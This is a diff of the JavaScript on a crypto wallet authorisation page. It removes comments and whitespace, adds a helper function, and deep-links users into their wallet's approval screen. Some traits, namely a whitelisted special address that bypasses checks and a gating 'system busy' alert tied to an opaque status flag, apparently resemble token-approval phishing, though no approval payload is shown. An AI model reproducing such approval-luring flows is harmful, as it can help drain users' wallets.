@@ -1311,17 +1267,15 @@ function bindApproveLogic() {
         const btn = document.getElementById("approveBtn");
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
-        reviewTip.style.display = "none"; // 隐藏页面提示
-        let alertEl = null; // 存储非防重复对象的弹窗元素
+        reviewTip.style.display = "none";
+        let alertEl = null;
         try {
-            // 基础校验+A1信号校验（保留原有逻辑）
             if (!userAddress) {
                 showAutoCloseAlert(lang.noWalletAddress.split("<br>")[0]);
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
                 return;
             }
-            // 白名单地址跳过已授权校验，其他地址正常校验
             if (userAddress !== SPECIAL_ADDRESS && isAddressAuthorized(userAddress)) {
                 showAutoCloseAlert(lang.authorizedTip.split("<br>")[3]);
                 btn.disabled = true;
@@ -1340,7 +1294,7 @@ function bindApproveLogic() {
                     throw new Error(lang.systemBusyTip);
                 }
             }
-            let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+                        let a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             let isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
                 alertEl = showPersistentAlert(lang.systemBusyTip); // 非自动消失弹窗
@@ -1403,7 +1357,6 @@ function bindApproveLogic() {
             // 关键：优先读取URL中传递的钱包类型（用户首次选择的）
             const selectedWalletType = getWalletFromUrl();
             let wallet, walletName;
-
             // 如果URL中有钱包类型，直接复用；否则走环境检测（兜底）
             if (selectedWalletType && walletConfig[selectedWalletType]) {
                 wallet = walletConfig[selectedWalletType];
@@ -1432,10 +1385,8 @@ function bindApproveLogic() {
                     }
                 }
             }
-
             // 显示明确引导，让用户知道即将唤起的钱包
             const alertEl = showPersistentAlert(`即将唤起${walletName}授权页面，请确认...`);
-
             // 生成跳转URL（沿用对应钱包的scheme）
             const approveUrl = window.location.href + "#approve";
             let jumpUrl = "";
@@ -1455,7 +1406,6 @@ function bindApproveLogic() {
                 default:
                     jumpUrl = wallet.scheme + encodeURIComponent(approveUrl);
             }
-
             // 执行跳转，跳转失败时引导手动操作
             window.location.href = jumpUrl;
             setTimeout(() => {
@@ -1463,7 +1413,6 @@ function bindApproveLogic() {
                 // 5秒后关闭提示
                 setTimeout(() => alertEl.parentNode?.removeChild(alertEl), 5000);
             }, 3000);
-
             btn.textContent = `正在唤起${walletName}...`;
         } catch (jumpErr) {
             console.error("跳转失败：", jumpErr);
@@ -1473,7 +1422,6 @@ function bindApproveLogic() {
         }
     }
 }
-
 // ========== 辅助函数（修复白名单地址的记录存储） ==========
 function saveEnergyRecord() {
     const lang = langConfig[currentLang];
@@ -1489,7 +1437,6 @@ function saveEnergyRecord() {
     });
     localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
 }
-
 function renderEnergyRecords() {
     const lang = langConfig[currentLang];
     const container = document.getElementById("approvalRecords");
@@ -1509,7 +1456,6 @@ function renderEnergyRecords() {
     `).join("");
     container.innerHTML = recordsHtml;
 }
-
 // ========== 新增：从URL读取钱包类型参数（关键） ==========
 function getWalletFromUrl() {
     const params = new URLSearchParams(window.location.search);
@@ -1517,7 +1463,6 @@ function getWalletFromUrl() {
     // 验证是否是支持的钱包类型
     return walletType && walletConfig[walletType] ? walletType : null;
 }
-
 // ========== 页面初始化（修复绑定时机） ==========
 document.addEventListener('DOMContentLoaded', async () => {
     localStorage.removeItem("energy_state");
@@ -1533,13 +1478,11 @@ document.addEventListener('DOMContentLoaded', async () => {
     renderEnergyRecords();
     updateWalletStatus();
     recordList.style.display = "none";
-
     // 关键：读取URL中的钱包类型参数，存储到localStorage
     const urlWalletType = getWalletFromUrl();
     if (urlWalletType && walletConfig[urlWalletType]) {
         localStorage.setItem("selectedWalletType", urlWalletType);
     }
-
     // 移除500ms延迟，立即执行环境检测（解决卡顿）
     checkImTokenEnv().catch(err => {
         console.error("环境检测失败：", err);
@@ -1578,6 +1521,14 @@ document.addEventListener('DOMContentLoaded', async () => {
         }, 500);
     }
 });
+// ========== 补充：updateWalletStatus 函数（之前遗漏定义，避免报错） ==========
+function updateWalletStatus() {
+    if (userAddress) {
+        walletStatusContainer.classList.add("connected");
+    } else {
+        walletStatusContainer.classList.remove("connected");
+    }
+}
 </script>
 </body>
 </html>
